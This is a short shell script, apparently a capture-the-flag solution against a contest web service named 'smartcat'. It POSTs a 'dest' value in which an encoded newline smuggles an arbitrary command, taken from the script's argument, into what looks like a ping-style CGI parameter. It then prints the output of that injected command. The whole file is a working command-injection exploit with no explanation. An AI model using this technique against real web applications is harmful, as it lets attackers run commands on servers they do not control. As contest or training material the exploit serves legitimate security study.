#!/bin/sh

curl --data dest="127.0.0.1%0A$1" smartcat.insomnihack.ch/cgi-bin/index.cgi|tail -n +22
